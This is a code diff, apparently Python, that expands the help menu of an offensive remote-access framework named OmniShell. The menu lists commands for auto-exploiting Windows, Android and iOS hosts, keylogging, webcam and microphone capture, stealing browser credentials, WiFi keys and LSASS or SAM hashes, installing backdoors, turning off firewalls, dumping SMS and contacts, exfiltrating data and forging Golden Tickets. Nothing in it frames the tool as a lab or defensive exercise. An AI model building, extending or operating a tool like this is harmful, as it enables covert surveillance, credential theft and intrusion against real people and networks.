+                "pwn <ip>               - Automated multi-vector exploit chain",
+                "attack / pwnall        - Global network-wide autonomous exploitation",
+                "exploit <ip>           - Targeted aggressive vulnerability exploitation",
+                "mobile-pwn <ip>        - Auto-exploitation of Android/iOS devices",
+                "scan-exploit <range>   - Sequential discovery and exploitation sweep",
+                "etblue-check <ip>      - MS17-010 EternalBlue vulnerability probe",
+                "smbghost <ip>          - CVE-2020-0796 SMBv3 compression check",
+                "printnightmare <ip>    - CVE-2021-34527 Print Spooler RCE check",
+                "petitpotam <ip>        - CVE-2021-36942 NTLM coercion probe",
+                "zerologon <ip>         - CVE-2020-1472 Netlogon privilege probe",
+                "bluekeep-check <ip>    - CVE-2019-0708 RDP pre-auth vulnerability check",
+                "nopac-check <ip>       - CVE-2021-42278 Active Directory spoofing check",
+                "smb-vulns <ip>         - Comprehensive SMB protocol vulnerability scan"
+            ],
+            "🎛 REMOTE CONTROL": [
+                "exec <cmd>             - Remote command execution (WMI/SSH/ADB)",
+                "winrm-exec <ip> <cmd>  - Command execution via WinRM (Port 5985/5986)",
+                "ps-exec <ip> <cmd>     - Execute PowerShell script blocks remotely",
+                "screen                 - Capture single remote desktop screenshot",
+                "screen-stream [count]  - High-speed JPEG screenshot telemetry stream",
+                "monitor / live         - Full live session (Screen + Keys + Audio)",
+                "webcam                 - Capture remote webcam snapshot",
+                "audio [duration]       - Record remote microphone audio",
+                "keylog                 - Initialize hidden keystroke interceptor",
+                "clip-get               - Retrieve current remote clipboard contents",
+                "clip-set <text>        - Inject text into remote clipboard",
+                "key-inject <keys>      - Remote keyboard automation via ComObject",
+                "mouse-click <x> <y>    - Remote mouse automation (Click coords)",
+                "open-url <url>         - Launch URL in default remote browser",
+                "play-media <url>       - Play video/audio URL on remote host",
+                "shutdown / reboot      - Remote power operations",
+                "logoff                 - Force logoff current remote session"
+            ],
+            "💎 DATA HARVESTING": [
+                "harvest / extract      - Execute deep data extraction payload",
+                "omnifetch <ip>         - Full data package retrieval (All logs/creds)",
+                "stealcreds             - Harvest browser-stored credentials",
+                "browser-history        - Extract browser history and bookmarks",
+                "steal-wifi             - Extract stored WiFi network profiles/keys",
+                "lsass-dump             - Minidump LSASS memory for hash recovery",
+                "tokens                 - Impersonation token harvesting",
+                "nethashes              - Extract local SAM and domain NTLM hashes",
+                "vault                  - Secure vault and DPAPI token extraction",
+                "sysinfo / systeminfo   - Full device property and hardware audit",
+                "pslist                 - List all remote running processes",
+                "killproc <pid/name>    - Terminate remote process by ID or image",
+                "software               - List all installed software on target"
+            ],
+            "🏗 PERSISTENCE": [
+                "persist                - Install 3-layer autonomous backdoor",
+                "persist-task <name>    - Create persistent scheduled task backdoor",
+                "persist-run <name>     - Install registry RunKey persistence",
+                "svc-install <n> <p>    - Deploy and start a custom system service",
+                "adduser <user> <pass>  - Create administrative local account",
+                "rdp-enable             - Remotely enable RDP and bypass firewall",
+                "rdp-disable            - Remotely disable RDP connections",
+                "firewall-off           - Disable all Windows Firewall profiles",
+                "firewall-on            - Enable all Windows Firewall profiles",
+                "firewall-add <p>       - Create inbound firewall port exception"
+            ],
+            "🐧 LINUX & ADB": [
+                "ssh <user>@<ip>        - Launch interactive SSH control session",
+                "ssh-exec <cmd>         - Parallel SSH command execution",
+                "linux-sysinfo          - Deep Linux kernel and system audit",
+                "linux-revshell <i:p>   - Deploy Linux bash reverse shell",
+                "linux-backdoor         - Install SSH key-based backdoor access",
+                "linux-cron <cmd>       - Install persistent crontab backdoor",
+                "adb-connect <ip>       - Establish ADB debugging connection",
+                "adb-shell <cmd>        - Execute shell on Android device",
+                "adb-screen             - Capture Android device screenshot",
+                "adb-sms                - Dump SMS database from Android device",
+                "adb-contacts           - Extract contact list from Android",
+                "adb-push / adb-pull    - High-speed file transfer to Android"
+            ],
+            "📂 FILE OPERATIONS": [
+                "ls [path]              - List remote directory contents (SMB/SFTP)",
+                "upload <local> <rem>   - Upload file to remote host",
+                "download <rem> <loc>   - Download file from remote host",
+                "rm <path>              - Delete remote file or directory",
+                "cat <path>             - Read remote file contents to terminal",
+                "wget <url> <path>      - Download file from internet to target",
+                "exfiltrate <src> <met> - Automated data exfiltration via SMB/HTTP/DNS"
+            ],
+            "☁️ CLOUD & DB": [
+                "db-extract <ip> <t>    - Targeted database content extraction",
+                "db-dump <ip> <t>       - Full database dump (All tables/schemas)",
+                "mysql-root <ip>        - Attempt unauthenticated MySQL root access",
+                "postgres <ip>          - Attempt unauthenticated PostgreSQL access",
+                "mongodb-pwn <ip>       - Exploit MongoDB no-auth configuration",
+                "redis-pwn <ip>         - Exploit Redis no-auth for data dump",
+                "s3-scan <bucket>       - Audit S3 bucket for public permissions",
+                "cloud-attack <type>    - Launch cloud metadata service exploit"
+            ],
+            "🏰 DOMAIN DOMINATION": [
+                "kerberoast <dc>        - Extract SPN service tickets for cracking",
+                "pass-spray <dom> <u> <p>- Large-scale domain credential validation",
+                "dcsync <dc>            - Perform DCSync user hash replication",
+                "asreproast <dc>        - Extract AS-REP tickets for pre-auth off",
+                "golden <dom> <sid> <h> - Forge Golden Ticket for persistent domain access",
+                "lateral <src> <dst>    - Automated multi-hop lateral progression"
+            ],
+            "⚙️ UTILITY": [
+                "targets                - List all discovered and fingerprinted assets",
+                "select <idx>           - Set active operational target context",
+                "setcreds <u> <p> [d]   - Global credential configuration",
+                "clear / history        - Terminal maintenance commands",
+                "exit / quit            - Orderly shutdown of framework"
+            ]
+        }
+
+        for category, cmd_list in categories.items():
+            print(f"\n{Fore.CYAN}{Style.BRIGHT}{category}")
+            for cmd_line in cmd_list:
+                print(f"  {Fore.WHITE}{cmd_line}")
         
-        print(f"\n{Fore.MAGENTA}REMOTE CONTROL & DATA:")
-        print("  exec <cmd>            - Execute command via WMI/SSH (uses current target)")
-        print("  screen                - Capture live remote desktop")
-        print("  keylog                - Start background keystroke interceptor")
-        print("  harvest               - Deep extraction of passwords, cookies, and tokens")
-        print("  lsass-dump            - Perform remote memory dump for hash recovery")
-        print("  sniff / creds         - Passive network traffic credential harvesting")
-        print(f"{Fore.LIGHTBLACK_EX}{'='*80}\n")
+        print(f"{Fore.LIGHTBLACK_EX}{'='*100}\n")
 
 async def main_loop():
     shell = OmniShell()
